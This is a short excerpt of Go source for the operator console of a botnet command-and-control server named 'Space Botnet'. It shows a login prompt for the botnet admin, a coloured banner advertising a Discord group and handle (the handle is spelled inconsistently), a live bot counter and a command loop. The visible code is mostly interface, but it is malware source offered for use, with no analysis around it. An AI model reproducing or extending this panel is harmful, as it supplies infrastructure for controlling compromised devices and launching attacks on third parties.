...
func (this *Admin) Handle() {
	...
	// Get username
	this.conn.Write([]byte(fmt.Sprintf("\033]0;Space Botnet || Please enter your credentials.\007")))
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\x1b[38;5;99mUsername \033[1;37m> \x1b[38;5;99m"))
	...
	// Get password
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\x1b[38;5;27mPassword \033[1;37m> \x1b[38;5;99m"))
	...
	this.conn.Write([]byte("\x1b[38;5;91m                      ╚═╝╩  ╩ ╩╚═╝╚═╝  ╚═╝╚═╝ ╩ ╝╚╝╚═╝ ╩ \r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m                 ╠═════════════════════════════════════════════╣\r\n"))
	this.conn.Write([]byte("\x1b[38;5;91m                     Dc group : https://discord.gg/AynwjYWVRn      \r\n"))
	this.conn.Write([]byte("\x1b[38;5;91m                            Discord : carlrafael.99              \r\n"))
	go func() {
		for {
			var BotCount int
	...
	for {
		...
		if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
			...
			this.conn.Write([]byte("\x1b[38;5;99m                 ╠═════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[38;5;91m                     Dc group : https://discord.gg/AynwjYWVRn      \r\n"))
			this.conn.Write([]byte("\x1b[38;5;91m                            Discord : carlrafael.9o              \r\n"))
			continue
		}
